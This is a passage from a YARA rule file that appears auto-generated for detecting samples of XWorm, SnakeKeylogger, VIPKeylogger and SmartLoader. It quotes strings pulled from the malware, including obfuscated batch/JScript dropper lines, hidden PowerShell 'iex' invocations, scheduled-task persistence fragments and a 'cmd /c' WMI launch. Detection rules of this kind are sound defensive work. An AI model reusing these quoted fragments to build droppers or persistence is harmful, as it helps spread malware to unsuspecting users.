      $s5 = "version='6.0.0.0'" fullword ascii /* score: '12.00'*/
      $s6 = "<!--The ID below indicates app support for Windows 10 -->" fullword ascii /* score: '12.00'*/
      $s7 = "version='1.0.0.0'" fullword ascii /* score: '12.00'*/
      $s8 = "name='Microsoft.Windows.Common-Controls'" fullword ascii /* score: '11.00'*/
      $s9 = "]TdPipeHD" fullword ascii /* score: '10.00'*/
      $s10 = "<description>Green software</description>" fullword ascii /* score: '10.00'*/
      $s11 = "WGetAJiveC" fullword ascii /* score: '9.00'*/
      $s12 = "7\\7`7d7A" fullword ascii /* score: '9.00'*/ /* hex encoded string 'w}z' */
      $s13 = "* :f;\\tZ" fullword ascii /* score: '9.00'*/
      $s14 = "vrrlkjoj" fullword ascii /* score: '8.00'*/
      $s15 = "romsoul" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__73031c79 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_73031c79.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "73031c79da6e755cc7bcd3fee4b770ecfe34852e19afc46fb89f80a90c664bf2"
   strings:
      $x1 = "[Console]::Title = ((Get-ScheduledTask).Actions.Execute -join '').Contains('" fullword wide /* score: '31.00'*/
      $s2 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s3 = "MBSKUI.exe" fullword wide /* score: '22.00'*/
      $s4 = "{0}.bat" fullword wide /* score: '12.00'*/
      $s5 = "GetEmbeddedResource" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*) and all of them
}

rule SnakeKeylogger_signature_ {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e27a15dbdc86d507183fcddbea9e1ded556479a7b6211e911f353e9e7c05f453"
   strings:
      $s1 = "Yxlnsccgq.exe" fullword wide /* score: '22.00'*/
      $s2 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s3 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s4 = "{694af78a-1bea-4084-b313-e89dcae85c73}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '9.00'*/
      $s5 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule SnakeKeylogger_signature__6476ef78 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_6476ef78.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6476ef78d6547cbaf23435608285bbee57956fba2858a714a624420586407225"
   strings:
      $s1 = "Ycsycu.exe" fullword wide /* score: '22.00'*/
      $s2 = "296e56744d27" ascii /* score: '17.00'*/ /* hex encoded string ')nVtM'' */
      $s3 = "{73286cc7-fe18-467d-bd8c-955260cf1492}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s4 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s5 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s6 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule SnakeKeylogger_signature__21371b611d91188d602926b15db6bd48_imphash_ {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_21371b611d91188d602926b15db6bd48(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "89c038c74408db3513639f5198af7ccb5405c571537ee17f2e8d44c444380a6d"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitec" ascii /* score: '26.00'*/
      $s2 = " publicKeyToken=\"6595b64144ccf1df\"/>" fullword ascii /* score: '13.00'*/
      $s3 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s4 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s5 = "vrrxwvov" fullword ascii /* score: '8.00'*/
      $s6 = "psspucw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e03fc70e {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e03fc70e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e03fc70e5d2e3c674a4b4bb92f438d70f66a51ea3ea30903486e0b8b58336d90"
   strings:
      $s1 = "XWormClient.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0d41bec1 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0d41bec1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0d41bec1e1df871d2a73908ea7f03498e78f8f75a65e87a7d863e333e1d4e65f"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADZVq|" fullword ascii /* score: '27.00'*/
      $s2 = "TymK.exe" fullword wide /* score: '22.00'*/
      $s3 = "get_ProcessedFiles" fullword ascii /* score: '20.00'*/
      $s4 = "<ProcessedFiles>k__BackingField" fullword ascii /* score: '15.00'*/
      $s5 = "set_ProcessedFiles" fullword ascii /* score: '15.00'*/
      $s6 = "{0:yyyy-MM-dd HH:mm} - {1} ({2} files)" fullword wide /* score: '15.00'*/
      $s7 = "* Copyright " fullword ascii /* score: '14.00'*/
      $s8 = "TymK.pdb" fullword ascii /* score: '14.00'*/
      $s9 = "get_CreateLogFile" fullword ascii /* score: '14.00'*/
      $s10 = ".tmp,.log,.cache" fullword wide /* score: '12.00'*/
      $s11 = "get_SkipSystemFiles" fullword ascii /* score: '12.00'*/
      $s12 = "backup_metadata.txt" fullword wide /* score: '11.00'*/
      $s13 = "exportBin" fullword ascii /* score: '10.00'*/
      $s14 = "Processing: ..." fullword wide /* score: '10.00'*/
      $s15 = "AutoYardInventorySweep" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__dae02f32a21e03ce65412f6e56942daa_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_dae02f32a21e03ce65412f6e56942daa(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6878354bb55ddb58cb56cd26aaa07c60fc61b275b9cd53a5e87d08c5def0d0ae"
   strings:
      $s1 = "schtasks.exe /run /tn \"" fullword wide /* score: '24.00'*/
      $s2 = "CPLApplet.dll" fullword wide /* score: '23.00'*/
      $s3 = "\" /sc minute /mo 1 /tr \"rundll32.exe \\\"" fullword wide /* score: '23.00'*/
      $s4 = "wtsapi64.dll" fullword wide /* score: '23.00'*/
      $s5 = "\\CPLApplet.dll" fullword ascii /* score: '21.00'*/
      $s6 = "SELECT * FROM Win32_Process WHERE ProcessId=" fullword wide /* score: '19.00'*/
      $s7 = "/create /f /tn \"" fullword wide /* score: '12.00'*/
      $s8 = ".NETFramework,Version=4.0" fullword ascii /* score: '10.00'*/
      $s9 = "CPLApplet" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s10 = "RegWrite" fullword wide /* PEStudio Blacklist: strings */ /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__efd746c3 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_efd746c3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "efd746c3d6b5f44f7df1eeb2f945a28b2f25398e841c1b69bbdf092aecc7643b"
   strings:
      $s1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword wide /* score: '22.00'*/
      $s2 = "get_MyProcess" fullword ascii /* score: '20.00'*/
      $s3 = "downloadfile" fullword wide /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s4 = "MyProcess_ErrorDataReceived" fullword ascii /* score: '18.00'*/
      $s5 = "SendHttpGetFlood" fullword ascii /* score: '17.00'*/
      $s6 = "Googlebot/2.1 (+http://www.googlebot.com/bot.html)" fullword wide /* score: '17.00'*/
      $s7 = "no.exe" fullword wide /* score: '16.00'*/
      $s8 = "GetFileDescription" fullword ascii /* score: '15.00'*/
      $s9 = "MyProcess_OutputDataReceived" fullword ascii /* score: '15.00'*/
      $s10 = "MyProcess" fullword ascii /* score: '15.00'*/
      $s11 = "set_MyProcess" fullword ascii /* score: '15.00'*/
      $s12 = "_MyProcess" fullword ascii /* score: '15.00'*/
      $s13 = "Process Started at: " fullword wide /* score: '15.00'*/
      $s14 = "Mutexx" fullword ascii /* score: '14.00'*/
      $s15 = "downloadedfile" fullword wide /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a6fc6ac5 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6fc6ac5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a6fc6ac52bb2eb9fbe527ec26f3f21b8a3775660883ccd55976a250910dcee2e"
   strings:
      $s1 = "OVgh.exe" fullword wide /* score: '22.00'*/
      $s2 = "OVgh.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "get_DigitalRoot" fullword ascii /* score: '12.00'*/
      $s4 = "GetDigitalRoot" fullword ascii /* score: '12.00'*/
      $s5 = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s6 = "Primes_{0}_{1}.txt" fullword wide /* score: '11.00'*/
      $s7 = "Built with .NET Framework 4.0" fullword wide /* score: '10.00'*/
      $s8 = "get_PrimeFactors" fullword ascii /* score: '9.00'*/
      $s9 = "get_IsPrime" fullword ascii /* score: '9.00'*/
      $s10 = "get_IsAbundant" fullword ascii /* score: '9.00'*/
      $s11 = "GetPrimesWithDigitSum" fullword ascii /* score: '9.00'*/
      $s12 = "get_IsPerfect" fullword ascii /* score: '9.00'*/
      $s13 = "get_FactorCount" fullword ascii /* score: '9.00'*/
      $s14 = "<GetPrimesWithDigitSum>b__0" fullword ascii /* score: '9.00'*/
      $s15 = "get_IsDeficient" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dd9feadf {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd9feadf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dd9feadf4c892cf8f7de7e4a55c8a2ab6c23da8249b4de14a3f4b6d135e70ac8"
   strings:
      $s1 = "EZFN fix.exe" fullword wide /* score: '19.00'*/
      $s2 = "                <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s3 = "lns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" fullword ascii /* score: '13.00'*/
      $s4 = "vkeyzeubimvlxhip" fullword wide /* score: '11.00'*/
      $s5 = "vkeyzeubimvlxhip.Resources" fullword ascii /* score: '10.00'*/
      $s6 = "eajahmvziqabwgjlhla" fullword ascii /* score: '8.00'*/
      $s7 = "tbkaubebdfwfwztncqbmsrfdqitta" fullword ascii /* score: '8.00'*/
      $s8 = "herftkzvardkuv" fullword ascii /* score: '8.00'*/
      $s9 = "fvjnarxucblmwvzqztknkzsfiyfjycsqexei" fullword ascii /* score: '8.00'*/
      $s10 = "psytbfvgqyuzig" fullword ascii /* score: '8.00'*/
      $s11 = "rhykqpwuavzfjuwypgplkdc" fullword ascii /* score: '8.00'*/
      $s12 = "jficnsvmpckkrgbn" fullword wide /* score: '8.00'*/
      $s13 = "ajwajnddgxccsbcjdzjrzlczqkdlmbzgpvumumizenmcitwjylpvqaipgwkzkrqfxwnxhpprqjmlzzrxptnamdqplfgxcjnmyhelfzciwxffmxphemjscpsugykbispg" wide /* score: '8.00'*/
      $s14 = "whmhtlrskebvrbbretxeiflildsxqhpp" fullword wide /* score: '8.00'*/
      $s15 = "wriypxkvycgvifxs" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0622f4c6 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0622f4c6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0622f4c6cd0694be28693f71caac5ee5979a48992e1e6f08302c06ac24eab66b"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD#sY" fullword ascii /* score: '27.00'*/
      $s2 = "miSI.exe" fullword wide /* score: '22.00'*/
      $s3 = "GetSystemPrinters" fullword ascii /* score: '19.00'*/
      $s4 = "<GetSystemPrinters>b__12_0" fullword ascii /* score: '19.00'*/
      $s5 = "miSI.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "* Copyright " fullword ascii /* score: '14.00'*/
      $s7 = "Contract_Template.pdf" fullword wide /* score: '14.00'*/
      $s8 = "<GetCompletedJobsCount>b__19_0" fullword ascii /* score: '12.00'*/
      $s9 = "GetCompletedJobsCount" fullword ascii /* score: '12.00'*/
      $s10 = "Meeting_Notes.txt" fullword wide /* score: '11.00'*/
      $s11 = "Report_Q3_2023.pdf" fullword wide /* score: '10.00'*/
      $s12 = "john.doe" fullword wide /* score: '10.00'*/
      $s13 = "GetActiveJobsCount" fullword ascii /* score: '9.00'*/
      $s14 = "GetPrintJobById" fullword ascii /* score: '9.00'*/
      $s15 = "<GetPrintJobById>b__0" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__008e92b1 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_008e92b1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "008e92b1ea12b53b06531097a36a5582e0856cd5f03cc188661bd40ea99dae1f"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\POhVXymABV\\src\\obj\\Debug\\hoCX.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "Executable files (*.exe)|*.exe|Dynamic Link Libraries (*.dll)|*.dll|Icon files (*.ico)|*.ico|Shortcut files (*.lnk)|*.lnk|All fi" wide /* score: '28.00'*/
      $s3 = "hoCX.exe" fullword wide /* score: '22.00'*/
      $s4 = "Select an executable, DLL, icon, or shortcut file" fullword wide /* score: '17.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Go XMP SDK 1.0\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns" ascii /* score: '10.00'*/
      $s7 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Go XMP SDK 1.0\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns" ascii /* score: '10.00'*/
      $s8 = "Portable Network Graphic (*.png)|*.png|All Files (*.*)|*.*" fullword wide /* score: '10.00'*/
      $s9 = "get_PreviousOpenFilePath" fullword ascii /* score: '9.00'*/
      $s10 = "get_PreviousSaveFilePath" fullword ascii /* score: '9.00'*/
      $s11 = "get_PreviousSelectedSaveFilter" fullword ascii /* score: '9.00'*/
      $s12 = "get_PreviousSelectedOpenFilter" fullword ascii /* score: '9.00'*/
      $s13 = "get_ShowBorderCheckBox_IsChecked" fullword ascii /* score: '9.00'*/
      $s14 = "get_PreviousFiles" fullword ascii /* score: '9.00'*/
      $s15 = "get_PreviouslySelectedListItemName" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__77ca6065 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_77ca6065.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "77ca6065fd5cddca4088ec32b3243f76b0b5746d4eec5c18b447a74631adf737"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\wzJoQrncsV\\src\\obj\\Debug\\nkhi.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "nkhi.exe" fullword wide /* score: '22.00'*/
      $s3 = "\\SERVER=localhost; Database=used_cars; UID=root; Password=dumbdaddy;allow user variables=true" fullword ascii /* score: '20.00'*/
      $s4 = "Login Failed !" fullword wide /* score: '18.00'*/
      $s5 = "select * from users where u_pass=md5('" fullword wide /* score: '16.00'*/
      $s6 = "Login_Load" fullword ascii /* score: '15.00'*/
      $s7 = "Used_cars.Presentation.Login.resources" fullword ascii /* score: '15.00'*/
      $s8 = "Login_Shown" fullword ascii /* score: '15.00'*/
      $s9 = "Password change Failed" fullword wide /* score: '15.00'*/
      $s10 = "Login Information" fullword wide /* score: '15.00'*/
      $s11 = "Login Failed... " fullword wide /* score: '13.00'*/
      $s12 = "Change_Password_Load" fullword ascii /* score: '12.00'*/
      $s13 = "changePasswordToolStripMenuItem_Click" fullword ascii /* score: '12.00'*/
      $s14 = "Change_Password" fullword wide /* score: '12.00'*/
      $s15 = "changePasswordToolStripMenuItem" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule SmartLoader_signature_ {
   meta:
      description = "_subset_batch - file SmartLoader(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f876a7551451c610f018c6b93356db1c338613a8449605720766f369bbdb572b"
   strings:
      $s1 = "lua.exe" fullword ascii /* score: '19.00'*/
      $s2 = "Launcher.cmd+.I,*Q" fullword ascii /* score: '15.00'*/
      $s3 = "lua51.dllPK" fullword ascii /* score: '13.00'*/
      $s4 = "Launcher.cmdPK" fullword ascii /* score: '10.00'*/
      $s5 = "* )L) " fullword ascii /* score: '9.00'*/
      $s6 = "lua.exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule SmartLoader_signature__17c0ca45 {
   meta:
      description = "_subset_batch - file SmartLoader(signature)_17c0ca45.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "17c0ca4568ff689dc96cd2c047401af3d53856cf8e31a2a43a35da66a43fda35"
   strings:
      $s1 = "lua.exe" fullword ascii /* score: '19.00'*/
      $s2 = "Launcher.cmd+.I,*Q" fullword ascii /* score: '15.00'*/
      $s3 = "lua51.dllPK" fullword ascii /* score: '13.00'*/
      $s4 = "Launcher.cmdPK" fullword ascii /* score: '10.00'*/
      $s5 = "* )L) " fullword ascii /* score: '9.00'*/
      $s6 = "lua.exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule SmartLoader_signature__72055a99 {
   meta:
      description = "_subset_batch - file SmartLoader(signature)_72055a99.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "72055a990bfb1df96243edd6cfcf9bbb19f29d1ddf5ad190e9b2b02e2a774dc0"
   strings:
      $s1 = "lua.exe" fullword ascii /* score: '19.00'*/
      $s2 = "Launcher.cmd+.I,*Q" fullword ascii /* score: '15.00'*/
      $s3 = "lua51.dllPK" fullword ascii /* score: '13.00'*/
      $s4 = "Launcher.cmdPK" fullword ascii /* score: '10.00'*/
      $s5 = "* )L) " fullword ascii /* score: '9.00'*/
      $s6 = "lua.exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule SmartLoader_signature__55923b87 {
   meta:
      description = "_subset_batch - file SmartLoader(signature)_55923b87.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "55923b87254ebd3d8d4608311d1c6e9ea9510f53021df9fd6f656a6720f7cd3f"
   strings:
      $s1 = "luajit.exe" fullword ascii /* score: '22.00'*/
      $s2 = "Application.bat" fullword ascii /* score: '14.00'*/
      $s3 = "conf.txt4" fullword ascii /* score: '11.00'*/
      $s4 = "JLGEtbr~" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule VIPKeylogger_signature__5b5e105d {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_5b5e105d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5b5e105d30a92ffb29a299c9f8fbc8ac95fbc92e499be48afacd9bc4c35701ab"
   strings:
      $x1 = "NexusPortal.WriteLine(\":: SGYC/+5JLSzNvQL6ZoiFbYrXL5Wu5JYnj8W/THPNI2t2yPALVgeiKAIn9QI1gFV8zwP2IqZj1Ga/x0M15qtweuPKUx9cTQOBjnkn2" ascii /* score: '41.00'*/
      $s2 = "NexusPortal.WriteLine(\"!bhczemxteeqdcya! \\\"%xhkrhynql%q%xhkrhynql%o%xhkrhynql%v%xhkrhynql%l%xhkrhynql%g%xhkrhynql%p%xhkrhynql" ascii /* score: '25.00'*/
      $s3 = "NexusPortal.WriteLine(\"%asurnvxdqxwau%%asurnvxdqxwau%c%asurnvxdqxwau%%asurnvxdqxwau%o%asurnvxdqxwau%%asurnvxdqxwau%p%asurnvxdqx" ascii /* score: '20.00'*/
      $s4 = "xhkrhynql%s%xhkrhynql%e%xhkrhynql%g%xhkrhynql%u=-nop -w h -c \\\"\\\"iex([Text.Enc\\\"\");" fullword ascii /* score: '19.00'*/
      $s5 = "NexusPortal.WriteLine(\"!bhczemxteeqdcya! \\\"%vogwxlsgo%c%vogwxlsgo%m%vogwxlsgo%t%vogwxlsgo%d%vogwxlsgo%c%vogwxlsgo%i%vogwxlsgo" ascii /* score: '19.00'*/
      $s6 = "NexusPortal.WriteLine(\"%mtwpaiwihtddia%%mtwpaiwihtddia%i%mtwpaiwihtddia%%mtwpaiwihtddia%f%mtwpaiwihtddia%%mtwpaiwihtddia% %mtwp" ascii /* score: '18.00'*/
      $s7 = "NexusPortal.WriteLine(\"!bhczemxteeqdcya! \\\"%vnekxfujh%g%vnekxfujh%x%vnekxfujh%i%vnekxfujh%n%vnekxfujh%a%vnekxfujh%i%vnekxfujh" ascii /* score: '18.00'*/
      $s8 = "NexusPortal.WriteLine(\"!bhczemxteeqdcya! \\\"%fqtzohvmd%b%fqtzohvmd%d%fqtzohvmd%y%fqtzohvmd%x%fqtzohvmd%v%fqtzohvmd%l%fqtzohvmd" ascii /* score: '17.00'*/
      $s9 = "NexusPortal.WriteLine(\"!bhczemxteeqdcya! \\\"%kuirgkace%v%kuirgkace%f%kuirgkace%d%kuirgkace%b%kuirgkace%m%kuirgkace%v%kuirgkace" ascii /* score: '17.00'*/
      $s10 = "e5Zy6quVNl2AuNNiexKXMwyD09HQ9VAJM63YgUCRMtPS00CXCsKyFiBG05hXrhCv2ge0huX+CC4Wz9GbSXkeClVU11V8GBs5PC2Dm/BdoKzxF+7UiGB7ehaxVuEyeqZa" ascii /* score: '16.00'*/
      $s11 = "BADKK3LIvgzS7hhaSUq0vJq81WPqHwMPyBbdVB/bXCIz5791OTwfyFtporWxogDCEVMSSr3R1cKjvmENCrh4QUbPbRygojqaAuDzvETsg/hew2AbisIf+NrGEupCq3Gf" ascii /* score: '16.00'*/
      $s12 = "AE1Pu7Y0H3Hd8tESpy6HrEXrS3yj3Y6btlq0BzgqIukTTAo8tpR+i4lnu1DX0fFT43DeT/qRAREIa4k2knOKwkMp7bFAQr5MJO3fK1SBA/vfTZwPdSw9u6/FyvU8RPhR" ascii /* score: '16.00'*/
      $s13 = "QFdlWgeTd8C2n+5titwR+Xo+9B2TfFBDqX1bd5LBdEbDZAwEXF1dejDeMlibwWm1at22RcjXOnAFvtxKak2ow45pI1YgNVf1Jr6waGboUYLit/QbE4eRe4XuMvLqDfzA" ascii /* score: '16.00'*/
      $s14 = "TxjI/T8VVW8u/IzdFBNWHqIoYf2RYBf+1t7onkYHy17HUYuP9JnuQFQ4Zq2sysiDyKvDBEmTR7W2EAD8/dyf0b/VPpLOXOA7K1afe3gETqeFfBIrC0jiqBjAPHQbA47r" ascii /* score: '16.00'*/
      $s15 = "znZd6HuoxK0To2O0XO8jFVSi8sKETvTxDV99axM83oLFtWOehgFBsDDbLuAU/X1ZobSpy3GK8qC5Sw57/6hvIpN2MMSCW3RLdeT5GmvsrefPcKvJJAX0POonKwy3S5H/" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule VIPKeylogger_signature_ {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b355c43bd26f9727f4a9461afe6ee78995deceb671ebfddc6f7cf895cc663a02"
   strings:
      $x1 = "VectorThread.WriteLine(\":: Myy2HqxhYxIYZ0ScrkAsTrOchauO2/Wf+GHr5WmjbdIapxP4C/6ScUVD8qB1d0L/onUQ6wwVcWOoD8EX45hKlE0uL7slW3M+iIVo" ascii /* score: '43.00'*/
      $s2 = "GetObject(NovaNetwork).Get(PhotonController).Create('cmd /c ' + CyberneticHandler, null, null, null);" fullword ascii /* score: '29.00'*/
      $s3 = "VectorThread.WriteLine(\"!efeskkrshaxhivs! \\\"%ecuhaptwk%b%ecuhaptwk%d%ecuhaptwk%q%ecuhaptwk%x%ecuhaptwk%r%ecuhaptwk%o%ecuhaptw" ascii /* score: '25.00'*/
      $s4 = "VectorThread.WriteLine(\"%jgjohemwtuq%%saumltvywgk%%htelbzcimia%%joznkcyjmmv%%rmlofozsbwl%%asvzmfmgfgn%%cfiqbnohdyg%%btnviiwpfir" ascii /* score: '23.00'*/
      $s5 = "VectorThread.WriteLine(\"%mththdzwzsdzb%%mththdzwzsdzb%c%mththdzwzsdzb%%mththdzwzsdzb%o%mththdzwzsdzb%%mththdzwzsdzb%p%mththdzwz" ascii /* score: '20.00'*/
      $s6 = "6vmrZBDoh+cQcPxOvG7pX1SUmDLLrvLKpv4ZU06cRKtirW9k0JfiDg8p+gda3HnMg4zUdxlL0IXHLheuX5ywwlH3SVmS86fTYQoVAzByq+tQVYxl5LPHmhZxFI9PwXvA" ascii /* score: '20.00'*/
      $s7 = "VectorThread.WriteLine(\"!efeskkrshaxhivs! \\\"%opgetpcvr%t%opgetpcvr%t%opgetpcvr%q%opgetpcvr%p%opgetpcvr%g%opgetpcvr%w%opgetpcv" ascii /* score: '19.00'*/
      $s8 = "nbGo/z7jH5Ec3BYbpb2y5O5RunKhGhl79ApKy8C/W7PWetfTPEvsxJoyyJoVAJjcSrtDrYJWYqQ7XllJ/8nmNSG5zfHsCj98OvHGxe4RsA8sNdSKaPuXHxJdU/yP/tus" ascii /* score: '19.00'*/
      $s9 = "VectorThread.WriteLine(\"!efeskkrshaxhivs! \\\"%gqbciujbt%g%gqbciujbt%d%gqbciujbt%s%gqbciujbt%f%gqbciujbt%d%gqbciujbt%u%gqbciujb" ascii /* score: '19.00'*/
      $s10 = "%ecuhaptwk%w%ecuhaptwk%d%ecuhaptwk%p%ecuhaptwk%x=-nop -w h -c \\\"\\\"iex([Text.Enc\\\"\");" fullword ascii /* score: '19.00'*/
      $s11 = "VectorThread.WriteLine(\"!efeskkrshaxhivs! \\\"%opgetpcvr%t%opgetpcvr%t%opgetpcvr%q%opgetpcvr%p%opgetpcvr%g%opgetpcvr%w%opgetpcv" ascii /* score: '19.00'*/
      $s12 = "VectorThread.WriteLine(\"%ncdhhxosmwfwln%%ncdhhxosmwfwln%i%ncdhhxosmwfwln%%ncdhhxosmwfwln%f%ncdhhxosmwfwln%%ncdhhxosmwfwln% %ncd" ascii /* score: '18.00'*/
      $s13 = "var CyberneticHandler = FluxRouter + '\\\\ArtificialPortal.bat';" fullword ascii /* score: '18.00'*/
